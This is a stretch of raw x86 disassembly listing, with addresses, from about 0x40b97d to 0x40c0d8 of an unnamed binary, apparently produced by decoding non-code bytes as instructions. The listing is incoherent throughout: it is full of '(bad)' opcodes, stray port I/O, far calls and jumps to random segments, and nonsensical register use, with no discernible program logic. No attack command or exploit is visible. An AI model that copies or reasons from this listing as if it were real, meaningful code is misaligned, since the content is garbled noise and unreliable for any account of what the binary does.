  40b97d:	xchg   ebp,eax
  40b97e:	add    BYTE PTR [edi-0x10b8089],dh
  40b984:	arpl   sp,di
  40b986:	mov    gs,WORD PTR [ebp+0x56bf86b5]
  40b98c:	mov    eax,0xc6584516
  40b991:	(bad)  
  40b992:	jno    0x40ba07
  40b994:	jle    0x40b9fe
  40b996:	inc    BYTE PTR [ebp+0x45]
  40b999:	xchg   BYTE PTR [esi+edi*8+0x54],cl
  40b99d:	mov    dh,0x0
  40b99f:	sub    dl,BYTE PTR [ecx-0x616c2d00]
  40b9a5:	loope  0x40b9b0
  40b9a7:	sbb    eax,DWORD PTR [eax+eax*2]
  40b9aa:	out    0x27,al
  40b9ac:	sbb    dh,bh
  40b9ae:	idiv   DWORD PTR [esi-0x1564bbe]
  40b9b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9b5:	fs popa 
  40b9b7:	and    esi,edi
  40b9b9:	inc    eax
  40b9ba:	pop    ebp
  40b9bb:	pop    edi
  40b9bc:	add    BYTE PTR [ebx+0x5fe605a6],bl
  40b9c2:	fs (bad) 
  40b9c4:	addr16 xchg edx,eax
  40b9c6:	add    BYTE PTR [esi],dl
  40b9c8:	push   ecx
  40b9c9:	add    bh,ch
  40b9cb:	scas   eax,DWORD PTR es:[edi]
  40b9cc:	push   ds
  40b9cd:	retf   
  40b9ce:	ss das 
  40b9d0:	push   0x45
  40b9d2:	es sysenter 
  40b9d5:	idiv   dh
  40b9d7:	out    0x0,al
  40b9d9:	add    BYTE PTR [eax-0x4032c283],al
  40b9df:	stc    
  40b9e0:	outs   dx,DWORD PTR ds:[esi]
  40b9e1:	and    al,0x0
  40b9e3:	mov    ecx,0xc27b003b
  40b9e8:	add    BYTE PTR [edx+edi*4+0x31f200fe],al
  40b9ef:	add    BYTE PTR [ebx],cl
  40b9f1:	retf   
  40b9f2:	fstp   QWORD PTR [edx+0xff37f9]
  40b9f8:	aaa    
  40b9f9:	mov    ch,0x0
  40b9fb:	out    0x50,eax
  40b9fd:	add    BYTE PTR [edx],dl
  40b9ff:	add    eax,0xa16c006c
  40ba04:	add    BYTE PTR [ecx-0x35ae3a7],bl
  40ba0a:	mov    ebx,DWORD PTR [edx]
  40ba0c:	mov    ah,BYTE PTR [eax]
  40ba0e:	imul   esp,esi,0xffffffa0
  40ba11:	(bad)  
  40ba12:	mov    eax,0x11de00da
  40ba17:	add    BYTE PTR [edi],ah
  40ba19:	out    0x45,eax
  40ba1b:	lods   eax,DWORD PTR ds:[esi]
  40ba1c:	rcl    ah,0xee
  40ba1f:	or     cl,BYTE PTR [edi+ebx*8]
  40ba22:	inc    esi
  40ba23:	cs (bad) 
  40ba25:	cmp    esi,DWORD PTR [esi+0x48fe6ff9]
  40ba2b:	add    BYTE PTR [eax-0x7f],cl
  40ba2e:	add    BYTE PTR [ebp-0x7efff78b],dh
  40ba34:	add    eax,DWORD PTR [eax]
  40ba36:	test   eax,0x92bc00fa
  40ba3b:	(bad)  
  40ba3c:	lods   al,BYTE PTR ds:[esi]
  40ba3d:	adc    eax,0xc8456f35
  40ba42:	inc    ebx
  40ba43:	sbb    al,0xc4
  40ba45:	pop    ds
  40ba46:	add    BYTE PTR [edi+0x59],bh
  40ba49:	xchg   BYTE PTR [edx-0x1a],cl
  40ba4c:	mov    edi,0x47fe17f9
  40ba51:	mov    ah,0x0
  40ba53:	xor    al,0x9f
  40ba55:	add    cl,dl
  40ba57:	xchg   ecx,eax
  40ba58:	mov    eax,0xefed00
  40ba5d:	fst    DWORD PTR [esi]
  40ba5f:	add    al,bl
  40ba61:	lods   eax,DWORD PTR ds:[esi]
  40ba62:	mov    ds:0xe6cdaeb5,eax
  40ba67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba68:	push   edx
  40ba69:	pop    edi
  40ba6a:	dec    esp
  40ba6b:	loopne 0x40ba0f
  40ba6d:	pop    ebx
  40ba6e:	fsubr  QWORD PTR [ecx-0x4]
  40ba71:	int    0x7f
  40ba73:	mov    BYTE PTR [esi+edi*8+0x10009072],ah
  40ba7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba7b:	add    ch,ch
  40ba7d:	mov    cl,0x0
  40ba7f:	leave  
  40ba80:	retf   
  40ba81:	add    cl,bh
  40ba83:	xor    bl,BYTE PTR [esi+0x50]
  40ba86:	aad    0xf1
  40ba88:	in     eax,dx
  40ba89:	scas   al,BYTE PTR es:[edi]
  40ba8a:	or     BYTE PTR [esi+0x7b],0x6c
  40ba8e:	cld    
  40ba8f:	add    DWORD PTR [eax],eax
  40ba91:	inc    edi
  40ba92:	push   esp
  40ba93:	fmul   DWORD PTR [ebx]
  40ba95:	ins    BYTE PTR es:[edi],dx
  40ba96:	mov    eax,eax
  40ba98:	(bad)  
  40ba99:	xchg   esp,eax
  40ba9a:	cld    
  40ba9b:	sbb    al,0x34
  40ba9d:	or     ebx,esi
  40ba9f:	(bad)  
  40baa0:	push   ss
  40baa1:	adc    al,0xc0
  40baa3:	mov    dh,BYTE PTR [esi]
  40baa5:	xor    eax,0x704e10b7
  40baaa:	rol    DWORD PTR [eax],1
  40baac:	sbb    DWORD PTR [edx+0x36],ebp
  40baaf:	mov    ah,0xaa
  40bab1:	and    al,BYTE PTR [edx]
  40bab3:	xchg   edi,eax
  40bab4:	cld    
  40bab5:	sbb    BYTE PTR [eax-0x5d],al
  40bab8:	sub    al,0x99
  40baba:	fsub   QWORD PTR [esi-0x1de121a]
  40bac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bac1:	fcomp  st(4)
  40bac3:	out    0x0,eax
  40bac5:	and    eax,0x2f46ece5
  40baca:	js     0x40ba54
  40bacc:	or     eax,0xfe6a2980
  40bad1:	push   ecx
  40bad2:	push   esi
  40bad3:	xor    BYTE PTR [ecx+0x0],dl
  40bad6:	mov    bl,0x73
  40bad8:	mov    esp,0xd232ada0
  40badd:	(bad)  
  40bade:	or     eax,0x7b6cf846
  40bae3:	add    BYTE PTR [esi-0x5d43273c],ah
  40bae9:	rcr    DWORD PTR [esi+0xfc21041],0x0
  40baf0:	jge    0x40bb4d
  40baf2:	xchg   BYTE PTR [eax+ebp*1+0x9c02f30],al
  40baf9:	add    BYTE PTR [eax-0x4e],al
  40bafc:	jb     0x40bacd
  40bafe:	inc    BYTE PTR [ebx-0x55]
  40bb01:	push   0xffffff9b
  40bb03:	sub    bl,ch
  40bb05:	jmp    0x983ccf1a
  40bb0a:	inc    eax
  40bb0b:	and    BYTE PTR [ecx+edi*2],ch
  40bb0e:	inc    ebp
  40bb0f:	cmp    DWORD PTR [ecx+0x1],0x0
  40bb13:	pop    ebp
  40bb14:	sbb    eax,0x7bd059bc
  40bb19:	mov    ds:0x1de66400,al
  40bb1e:	mov    dh,0xa2
  40bb20:	jno    0x40bb56
  40bb22:	adc    dh,BYTE PTR [ecx-0x5f93f3ba]
  40bb28:	add    bh,dl
  40bb2a:	inc    edi
  40bb2b:	cmp    DWORD PTR [ecx-0x3d],0xb3bc30e7
  40bb32:	add    dh,ch
  40bb34:	or     al,0x12
  40bb36:	jns    0x40bb98
  40bb38:	mov    ss,WORD PTR [eax-0x4f]
  40bb3b:	jns    0x40bb37
  40bb3d:	and    eax,0xbe6b4500
  40bb42:	adc    BYTE PTR [ecx+0x1e],al
  40bb45:	dec    BYTE PTR [edx+0x5a0b442a]
  40bb4b:	pop    es
  40bb4c:	(bad)  
  40bb4d:	(bad)  
  40bb4e:	lods   al,BYTE PTR ds:[esi]
  40bb4f:	xor    edi,DWORD PTR [esi]
  40bb51:	std    
  40bb52:	mov    ebx,0x4e0a1a0a
  40bb57:	aaa    
  40bb58:	mov    eax,fs
  40bb5a:	nop
  40bb5b:	sub    edi,DWORD PTR [ebx+edi*8-0x64b3e532]
  40bb62:	pop    esp
  40bb63:	mov    dh,0x70
  40bb65:	test   dl,0x64
  40bb68:	in     al,dx
  40bb69:	icebp  
  40bb6a:	adc    DWORD PTR [esi+0x2716d456],eax
  40bb70:	in     al,dx
  40bb71:	int3   
  40bb72:	lods   al,BYTE PTR ds:[esi]
  40bb73:	sbb    ebx,DWORD PTR [edx+esi*1-0x1]
  40bb77:	xchg   BYTE PTR [edx-0x42],al
  40bb7a:	es (bad) 
  40bb7c:	adc    al,0x50
  40bb7e:	add    BYTE PTR [eax+0x22],dl
  40bb81:	add    BYTE PTR [ebp-0x6ca52993],ch
  40bb87:	lods   eax,DWORD PTR ds:[esi]
  40bb88:	mov    edx,0x76a60b89
  40bb8d:	mov    ah,0x70
  40bb8f:	lods   al,BYTE PTR ds:[esi]
  40bb90:	dec    esp
  40bb91:	ret    0xbcac
  40bb94:	push   0xfffffff3
  40bb96:	scas   al,BYTE PTR es:[edi]
  40bb97:	cmp    ebp,esp
  40bb99:	mov    esp,0x60700e3
  40bb9e:	sbb    BYTE PTR [ebx+eax*1-0x4f43b100],0x40
  40bba6:	mov    al,0xc2
  40bba8:	retf   0x89c9
  40bbab:	int3   
  40bbac:	js     0x40bba3
  40bbae:	neg    DWORD PTR [eax+0x60]
  40bbb1:	pop    esi
  40bbb2:	aad    0x4a
  40bbb4:	push   cs
  40bbb5:	lock xchg ecx,eax
  40bbb7:	add    ch,bh
  40bbb9:	sub    dh,al
  40bbbb:	push   edi
  40bbbc:	pop    ss
  40bbbd:	xchg   BYTE PTR [esi-0x75df9faa],ah
  40bbc3:	arpl   WORD PTR [esi-0x1a1efe2],di
  40bbc9:	jmp    0x40bb73
  40bbcb:	xor    bh,bh
  40bbcd:	jo     0x40bb67
  40bbcf:	add    BYTE PTR [eax],bl
  40bbd1:	loop   0x40bbd3
  40bbd3:	in     eax,0xa5
  40bbd5:	inc    edx
  40bbd6:	rol    DWORD PTR [eax],1
  40bbd8:	stos   BYTE PTR es:[edi],al
  40bbd9:	inc    esi
  40bbda:	aam    0xda
  40bbdc:	outs   dx,BYTE PTR ds:[esi]
  40bbdd:	inc    ebx
  40bbde:	in     al,dx
  40bbdf:	(bad)  
  40bbe0:	hlt    
  40bbe1:	push   ss
  40bbe2:	gs jae 0x40bc18
  40bbe5:	adc    BYTE PTR [ecx],bh
  40bbe7:	xchg   esp,eax
  40bbe8:	dec    ebp
  40bbe9:	int3   
  40bbea:	mov    edi,0x7076c2a1
  40bbef:	jp     0x40bbef
  40bbf1:	jo     0x40bb77
  40bbf3:	add    BYTE PTR [edx+eax*4],al
  40bbf6:	add    BYTE PTR [ecx],al
  40bbf8:	sar    DWORD PTR [eax+eax*1+0x3d00ab4d],0xbf
  40bc00:	loop   0x40bc48
  40bc02:	inc    eax
  40bc03:	leave  
  40bc04:	add    BYTE PTR [ebp+0x72],dh
  40bc07:	call   0x4f8f:0x46cd86ff
  40bc0e:	(bad)  
  40bc0f:	jge    0x40bc11
  40bc11:	stos   DWORD PTR es:[edi],eax
  40bc12:	sub    DWORD PTR [eax],eax
  40bc14:	out    0xd4,eax
  40bc16:	add    BYTE PTR [esi-0x55ecfd51],dl
  40bc1c:	mov    ah,dh
  40bc1e:	loopne 0x40bbb6
  40bc20:	sbb    eax,0x86ff66fe
  40bc25:	and    BYTE PTR [edx+0x5a535019],0x24
  40bc2c:	(bad)  
  40bc2d:	cmp    al,0x5e
  40bc2f:	add    BYTE PTR [edx+0x19],dl
  40bc32:	add    BYTE PTR [ebx-0x3201995],ch
  40bc38:	aaa    
  40bc39:	data16 add BYTE PTR [edi-0xf20ffeb],dl
  40bc40:	add    BYTE PTR [edx-0x33ff3373],dh
  40bc46:	cdq    
  40bc47:	add    BYTE PTR [ecx],bh
  40bc49:	stc    
  40bc4a:	outs   dx,DWORD PTR ds:[esi]
  40bc4b:	xor    BYTE PTR [ebp+edx*2+0x528705ae],dh
  40bc52:	jle    0x40bc34
  40bc54:	(bad)  
  40bc55:	push   ecx
  40bc56:	mov    edx,0xa6863e00
  40bc5b:	and    dh,bl
  40bc5d:	jmp    0x98c88362
  40bc62:	repz dec esp
  40bc64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc65:	xchg   BYTE PTR [edx-0x31285553],ah
  40bc6b:	(bad)  
  40bc6c:	jmp    FWORD PTR [eax-0x298faa34]
  40bc72:	sbb    ah,dh
  40bc74:	neg    BYTE PTR [ecx]
  40bc76:	fwait
  40bc77:	jmp    DWORD PTR [ebx+0x0]
  40bc7a:	xor    ebx,DWORD PTR [edx+0x1d5c00]
  40bc80:	jno    0x40bc9c
  40bc82:	leave  
  40bc83:	(bad)  
  40bc84:	fs mov ebx,0x437f9ba0
  40bc8a:	imul   ebx,esp,0xffffff8f
  40bc8d:	inc    esi
  40bc8e:	jmp    0x4994:0x14e7fe
  40bc95:	add    BYTE PTR [ecx+0x31],dh
  40bc98:	and    al,0x0
  40bc9a:	inc    esp
  40bc9b:	rep outs dx,DWORD PTR ds:[esi]
  40bc9d:	dec    BYTE PTR [ebp+0x4f]
  40bca0:	add    BYTE PTR [ebx],dl
  40bca2:	mov    dh,0x0
  40bca4:	js     0x40bcea
  40bca6:	add    BYTE PTR [eax],0x6
  40bca9:	fld    DWORD PTR [eax]
  40bcab:	(bad)  
  40bcac:	mov    edi,0xf3734fbe
  40bcb1:	cmp    al,0xfe
  40bcb3:	push   cs
  40bcb4:	inc    ebp
  40bcb5:	and    al,0x42
  40bcb7:	add    BYTE PTR [eax+edi*2+0x6e69f39a],cl
  40bcbe:	sahf   
  40bcbf:	shr    DWORD PTR [edi-0x32e5ff22],cl
  40bcc5:	es popa 
  40bcc7:	jns    0x40bd07
  40bcc9:	int    0xcd
  40bccb:	aaa    
  40bccc:	bound  eax,QWORD PTR [eax]
  40bcce:	test   al,0x70
  40bcd0:	stos   BYTE PTR es:[edi],al
  40bcd1:	out    dx,eax
  40bcd2:	test   al,0x73
  40bcd4:	repz cmp al,0xb9
  40bcd7:	test   BYTE PTR [eax],0x36
  40bcda:	ds jge 0x40bd1c
  40bcdd:	xchg   edi,eax
  40bcde:	add    ah,al
  40bce0:	imul   ebp,DWORD PTR [esi-0x62],0xbd9bb4f
  40bce7:	fiadd  WORD PTR [ebx]
  40bce9:	add    BYTE PTR [edx+0x1a],dl
  40bcec:	pop    edi
  40bced:	pusha  
  40bcee:	shl    ebx,1
  40bcf0:	dec    ecx
  40bcf1:	cdq    
  40bcf2:	pop    edx
  40bcf3:	out    0x24,al
  40bcf5:	(bad)  
  40bcf6:	(bad)  
  40bcf7:	bound  ebx,QWORD PTR [edx+0x7f3ff300]
  40bcfd:	repz fstp st(7)
  40bd00:	add    cl,ch
  40bd02:	test   eax,0x12fc00
  40bd07:	xchg   esi,eax
  40bd08:	and    esi,eax
  40bd0a:	and    al,BYTE PTR [eax]
  40bd0c:	dec    ebx
  40bd0d:	dec    ecx
  40bd0e:	add    BYTE PTR [ecx+0x10],bh
  40bd11:	lods   eax,DWORD PTR ds:[esi]
  40bd12:	cmp    eax,0x6200377f
  40bd17:	add    BYTE PTR [eax],0x0
  40bd1a:	mov    bh,0x7e
  40bd1c:	retf   0xac39
  40bd1f:	or     DWORD PTR [edx-0x2f2f2f],ebp
  40bd25:	jns    0x40bd7d
  40bd27:	jb     0x40bcf7
  40bd29:	mov    dh,bh
  40bd2b:	ja     0x40bd95
  40bd2d:	inc    BYTE PTR ds:0xe83538d6
  40bd33:	js     0x40bcc7
  40bd35:	push   ebx
  40bd36:	add    BYTE PTR [ebx+0x70ec00ec],dl
  40bd3c:	fldenv [edx-0x53f97407]
  40bd42:	out    0xa7,al
  40bd44:	add    BYTE PTR [eax-0x1edfffa3],bh
  40bd4a:	pop    edx
  40bd4b:	inc    ecx
  40bd4c:	xchg   ebp,eax
  40bd4d:	jge    0x40bce2
  40bd4f:	shr    BYTE PTR [edx-0x5c],1
  40bd52:	add    BYTE PTR [bx+si],ch
  40bd55:	inc    esi
  40bd56:	inc    eax
  40bd57:	nop
  40bd58:	or     BYTE PTR [eax-0x28],bh
  40bd5b:	cld    
  40bd5c:	mov    ds:0x6fae7f,al
  40bd61:	mov    ebp,0x50c800c8
  40bd66:	mov    dh,0xf5
  40bd68:	add    BYTE PTR [esi-0x67feff19],dh
  40bd6e:	jns    0x40bde9
  40bd70:	sub    ebp,DWORD PTR [edx-0x29]
  40bd73:	(bad)  
  40bd74:	and    al,BYTE PTR [eax+0x3a]
  40bd77:	mov    dh,0xc0
  40bd79:	sbb    al,0x44
  40bd7b:	lahf   
  40bd7c:	add    bh,bh
  40bd7e:	call   0xb:0x68be610b
  40bd85:	retf   0xfe8b
  40bd88:	nop
  40bd89:	add    BYTE PTR [edx+0x1f],dl
  40bd8c:	dec    edi
  40bd8d:	jae    0x40bd82
  40bd8f:	jl     0x40bd59
  40bd91:	xchg   ebp,eax
  40bd92:	and    eax,0xb2de0080
  40bd97:	clc    
  40bd98:	repz imul ebp,DWORD PTR [esi-0x62],0x30e425
  40bda0:	ins    BYTE PTR es:[edi],dx
  40bda1:	and    al,0x68
  40bda3:	mov    bl,0x79
  40bda5:	ds int 0xcd
  40bda8:	jnp    0x40bd4a
  40bdaa:	add    dl,bh
  40bdac:	mov    eax,ds:0x371a4118
  40bdb1:	iret   
  40bdb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdb3:	mov    ecx,0x40880050
  40bdb8:	cwde   
  40bdb9:	iret   
  40bdba:	lods   al,BYTE PTR ds:[esi]
  40bdbb:	rol    BYTE PTR [eax],0x16
  40bdbe:	out    0xe6,al
  40bdc0:	stc    
  40bdc1:	xor    al,0xa6
  40bdc3:	cmp    ebx,DWORD PTR [ebp+0x33]
  40bdc6:	inc    ebp
  40bdc7:	add    BYTE PTR [ebx+edx*8+0x6b9f3cdc],ah
  40bdce:	(bad)  
  40bdcf:	jmp    0x40bd76
  40bdd1:	aad    0x0
  40bdd3:	xor    bh,al
  40bdd5:	jl     0x40bd71
  40bdd7:	fwait
  40bdd8:	out    0x1b,eax
  40bdda:	jns    0x40bdfc
  40bddc:	pop    ebp
  40bddd:	add    al,al
  40bddf:	xchg   ecx,eax
  40bde0:	out    0x7,eax
  40bde2:	sahf   
  40bde3:	dec    edi
  40bde4:	jae    0x40bdd9
  40bde6:	lds    ebp,FWORD PTR ds:0x4b074e00
  40bdec:	xchg   ebp,eax
  40bded:	data16 int 0xf3
  40bdf0:	imul   ebp,DWORD PTR [esi-0x7b],0x51e0dc00
  40bdf7:	and    edx,ebx
  40bdf9:	fwait
  40bdfa:	mov    ecx,0xcd3e79
  40bdff:	push   0x79b3c127
  40be04:	add    DWORD PTR [eax],eax
  40be06:	cli    
  40be07:	xor    al,0x37
  40be09:	iret   
  40be0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be0b:	adc    DWORD PTR [eax+0x3d],0xf
  40be0f:	call   0x9fa74214
  40be14:	out    0xe6,al
  40be16:	stc    
  40be17:	and    bh,cl
  40be19:	cmp    BYTE PTR [eax+0x0],0x16
  40be1d:	fld    TBYTE PTR [edi-0x2e5583a7]
  40be23:	and    ah,BYTE PTR es:[eax-0x14f89102]
  40be2a:	in     eax,0xf9
  40be2c:	xor    al,0x9f
  40be2e:	pop    edi
  40be2f:	add    BYTE PTR [edx],dh
  40be31:	call   FWORD PTR [ebp+esi*2+0x29f3cd45]
  40be38:	inc    esp
  40be39:	mov    esi,0x5eb92fe
  40be3e:	les    esp,FWORD PTR ds:0xcd3e79b9
  40be44:	add    BYTE PTR [esp+eax*1+0x7f],cl
  40be48:	xchg   ebx,eax
  40be49:	pop    ebx
  40be4a:	mov    ch,0x0
  40be4c:	fidiv  DWORD PTR [edi+esi*1]
  40be4f:	iret   
  40be50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be51:	mov    cs,ebx
  40be53:	and    esi,edi
  40be55:	or     eax,0x9f3a6800
  40be5a:	out    0xe6,al
  40be5c:	stc    
  40be5d:	inc    edi
  40be5e:	scas   eax,DWORD PTR es:[edi]
  40be5f:	dec    esp
  40be60:	popf   
  40be61:	add    dh,dh
  40be63:	(bad)  
  40be64:	std    
  40be65:	cmp    eax,0x3cc3a8ff
  40be6a:	push   ds
  40be6b:	jle    0x40bdf1
  40be6d:	(bad)  
  40be6e:	pop    esp
  40be6f:	add    BYTE PTR [ecx-0x2e8aff0d],dh
  40be75:	or     cl,ah
  40be77:	aaa    
  40be78:	mov    ch,0xf7
  40be7a:	add    BYTE PTR [eax+0x51],dh
  40be7d:	outs   dx,DWORD PTR ss:[esi]
  40be7f:	and    ch,BYTE PTR [ebp-0x2f799bb0]
  40be85:	ss push 0xfffffff6
  40be88:	loopne 0x40beeb
  40be8a:	inc    esp
  40be8b:	pop    ebx
  40be8c:	aam    0xd1
  40be8e:	dec    edx
  40be8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be90:	xor    BYTE PTR [edx+ebx*1-0x67],ah
  40be94:	fnclex 
  40be96:	sbb    al,0x79
  40be98:	jb     0x40be8d
  40be9a:	cmp    al,0xfe
  40be9c:	and    al,0xe5
  40be9e:	xchg   DWORD PTR [eax+eax*1+0x2c],ebp
  40bea2:	mov    ah,0x77
  40bea4:	test   eax,0x20e6953c
  40bea9:	add    al,0x4f
  40beab:	mov    esp,0x4f20cac9
  40beb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40beb1:	je     0x40beca
  40beb3:	sub    al,0xec
  40beb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beb6:	rcl    BYTE PTR [esi+ebx*4-0x51],cl
  40beba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bebb:	clc    
  40bebc:	pop    esp
  40bebd:	das    
  40bebe:	in     eax,0xa9
  40bec0:	xor    al,0x95
  40bec2:	adc    al,0x4a
  40bec4:	les    esi,FWORD PTR [eax+0x2a7cf38c]
  40beca:	dec    ebp
  40becb:	shl    BYTE PTR [edx+edi*1],0x19
  40becf:	retf   
  40bed0:	mov    eax,ds:0x734f9e6e
  40bed5:	pop    edi
  40bed6:	add    BYTE PTR [edx],dl
  40bed8:	leave  
  40bed9:	cdq    
  40beda:	push   ebp
  40bedb:	add    dl,bl
  40bedd:	add    BYTE PTR [ebp+ecx*8+0x4d69f3cd],bl
  40bee4:	sub    edi,esp
  40bee6:	mov    dl,0x67
  40bee8:	add    BYTE PTR [esi],ch
  40beea:	in     al,0xa7
  40beec:	mov    ecx,0x71b93e79
  40bef1:	pop    ds
  40bef2:	repz add BYTE PTR [eax-0x7deae59d],bh
  40bef9:	iret   
  40befa:	dec    ecx
  40befb:	add    edx,edi
  40befd:	cmp    al,0x8a
  40beff:	xor    al,0x4a
  40bf01:	mov    dl,0x47
  40bf03:	pop    edx
  40bf04:	sar    bh,1
  40bf06:	jne    0x40bece
  40bf08:	leave  
  40bf09:	(bad)  
  40bf0a:	dec    BYTE PTR [eax-0x56]
  40bf0d:	jbe    0x40bf53
  40bf0f:	in     eax,0x2f
  40bf11:	mov    edx,0xa3fe9784
  40bf16:	add    bl,ah
  40bf18:	loope  0x40bf1a
  40bf1a:	pop    ecx
  40bf1b:	pop    ds
  40bf1c:	out    0xcd,eax
  40bf1e:	repz imul ebp,DWORD PTR [esi],0x6600a7fe
  40bf25:	sbb    ecx,ebp
  40bf27:	test   eax,0x79b92c11
  40bf2c:	ds int 0x0
  40bf2f:	lock cwde 
  40bf31:	fs cmp esp,esi
  40bf34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf35:	add    BYTE PTR [edx-0x5830c8d9],al
  40bf3b:	pop    ebx
  40bf3c:	sbb    al,0xc5
  40bf3e:	mov    dh,0x54
  40bf40:	add    BYTE PTR [esp+ecx*4],cl
  40bf43:	repz imul ebp,DWORD PTR [esi-0x62],0xcc0857
  40bf4b:	sahf   
  40bf4c:	push   ebx
  40bf4d:	xor    al,0xe1
  40bf4f:	jns    0x40bf8f
  40bf51:	int    0xcd
  40bf53:	mov    esp,0xd928007c
  40bf58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf59:	jae    0x40bf89
  40bf5b:	mov    edi,0xe4b9a7d1
  40bf60:	add    BYTE PTR [edx-0x2d383],bh
  40bf66:	mov    ebp,0xb3be0071
  40bf6b:	add    BYTE PTR [ebp-0x6f],al
  40bf6e:	stc    
  40bf6f:	lahf   
  40bf70:	inc    esp
  40bf71:	add    BYTE PTR es:[eax],bh
  40bf74:	mov    cl,0x0
  40bf76:	mov    ah,0x22
  40bf78:	mov    esp,0x6cf41cbb
  40bf7d:	push   0x41
  40bf7f:	push   edx
  40bf80:	or     al,0xa2
  40bf82:	das    
  40bf83:	clc    
  40bf84:	daa    
  40bf85:	xchg   ebp,eax
  40bf86:	lea    esi,[esi+0x6aa52c56]
  40bf8c:	jnp    0x40bf22
  40bf8e:	in     al,0x18
  40bf90:	(bad)  
  40bf91:	mov    edi,0x9541cd23
  40bf96:	cmp    eax,0x6a00753f
  40bf9b:	or     al,0x4c
  40bf9d:	nop
  40bf9e:	dec    edi
  40bf9f:	cmp    al,0xb
  40bfa1:	lods   al,BYTE PTR ds:[esi]
  40bfa2:	pusha  
  40bfa3:	inc    ebx
  40bfa4:	fcom   st(4)
  40bfa6:	or     BYTE PTR [edx+0x187c025a],bl
  40bfac:	mov    esi,?
  40bfae:	push   es
  40bfaf:	and    DWORD PTR [edx],ecx
  40bfb1:	inc    esp
  40bfb2:	enter  0x7e2a,0xfe
  40bfb6:	loopne 0x40bff8
  40bfb8:	or     DWORD PTR [eax-0x80],0xffffff90
  40bfbc:	call   0xed5b:0x5e9be678
  40bfc3:	mov    eax,0x10ae8afe
  40bfc8:	jo     0x40bfc7
  40bfca:	repz sar edi,1
  40bfcd:	pop    eax
  40bfce:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfd0:	scas   al,BYTE PTR es:[edi]
  40bfd1:	call   0xe2515114
  40bfd6:	test   BYTE PTR [eax],0x65
  40bfd9:	shl    bl,cl
  40bfdb:	stos   DWORD PTR es:[edi],eax
  40bfdc:	fst    DWORD PTR [esi]
  40bfde:	push   0x4c52ecd7
  40bfe3:	mov    eax,0x401309ff
  40bfe8:	mov    eax,ds:0xc05515a0
  40bfed:	add    eax,0x1422048c
  40bff2:	nop
  40bff3:	inc    edx
  40bff4:	int    0xbe
  40bff6:	mov    eax,ds:0x729ffeb2
  40bffb:	sbb    eax,esp
  40bffd:	cmp    dl,0x0
  40c000:	adc    eax,0x422287b
  40c005:	aaa    
  40c006:	ins    BYTE PTR es:[edi],dx
  40c007:	sbb    eax,0x7ef26886
  40c00c:	cmp    al,0x3a
  40c00e:	mov    ebx,0xdbfe77
  40c013:	dec    esp
  40c014:	lea    ebp,[eax-0x18]
  40c017:	cmp    dl,BYTE PTR [edx-0x7131bb27]
  40c01d:	mov    esi,0x5e6af41
  40c022:	cld    
  40c023:	cmp    DWORD PTR [eax],eax
  40c025:	inc    ebx
  40c026:	popa   
  40c027:	je     0x40c028
  40c029:	fidivr DWORD PTR [esi-0x13]
  40c02c:	push   0x20db4d6a
  40c031:	fcomp  QWORD PTR [edx]
  40c033:	pop    esi
  40c034:	sbb    al,0x78
  40c036:	fwait
  40c037:	push   edi
  40c038:	mov    edi,0xfe173f34
  40c03d:	push   ebx
  40c03e:	add    BYTE PTR [ecx+0x4],ch
  40c041:	add    BYTE PTR [esi],bl
  40c043:	fs pop ebp
  40c045:	mov    bl,0x0
  40c047:	(bad)  
  40c049:	scas   al,BYTE PTR es:[edi]
  40c04a:	mov    ds:0x59005ee6,al
  40c04f:	push   eax
  40c050:	sub    al,0x40
  40c052:	push   eax
  40c053:	push   cs
  40c054:	inc    edi
  40c055:	loop   0x40c011
  40c057:	pusha  
  40c058:	xchg   eax,esp
  40c05a:	adc    edi,esi
  40c05c:	lods   eax,DWORD PTR ds:[esi]
  40c05d:	push   esi
  40c05e:	not    BYTE PTR [edx]
  40c060:	stc    
  40c061:	push   edx
  40c062:	add    ch,ah
  40c064:	jo     0x40c07a
  40c066:	call   0x160e:0x2684c0dc
  40c06d:	sub    bh,BYTE PTR [ebx-0x78]
  40c070:	sbb    eax,0xfe510dcc
  40c075:	cmp    esp,DWORD PTR [ecx]
  40c077:	mov    esi,0x686b813c
  40c07c:	int    0x37
  40c07e:	pop    ecx
  40c07f:	lods   eax,DWORD PTR ds:[esi]
  40c080:	cs push ss
  40c082:	sbb    ah,BYTE PTR [ebp-0x7926891e]
  40c088:	jbe    0x40c088
  40c08a:	pop    esi
  40c08b:	push   ss
  40c08c:	fst    DWORD PTR [esi+0x57]
  40c08f:	(bad)  
  40c090:	hlt    
  40c091:	mov    dh,0xcd
  40c093:	push   0x21c36a97
  40c098:	(bad)  
  40c099:	pop    ds
  40c09a:	enter  0xb898,0x48
  40c09e:	mov    al,0xda
  40c0a0:	shl    DWORD PTR [eax-0x1016ec0],1
  40c0a6:	xchg   ebp,eax
  40c0a7:	pop    edx
  40c0a8:	push   es
  40c0a9:	jle    0x40c056
  40c0ab:	mov    ds:0xe8e80b5d,al
  40c0b0:	sbb    al,0xf8
  40c0b2:	sub    BYTE PTR [esi-0x4d4c8c79],dh
  40c0b8:	(bad)  
  40c0b9:	sbb    al,BYTE PTR [ebx]
  40c0bb:	in     eax,0x79
  40c0bd:	in     al,dx
  40c0be:	add    BYTE PTR [ebx-0x2],cl
  40c0c1:	inc    BYTE PTR [ebx+0x6c]
  40c0c4:	pop    ebp
  40c0c5:	mov    WORD PTR [ebx-0x103d36c],ds
  40c0cb:	pop    edx
  40c0cc:	add    BYTE PTR [bp+0x76],bl
  40c0d1:	pop    esi
  40c0d2:	test   al,0x28
  40c0d4:	pop    eax
  40c0d5:	pusha  
  40c0d6:	inc    edx
  40c0d7:	xchg   edx,eax
  40c0d8:	pop    eax
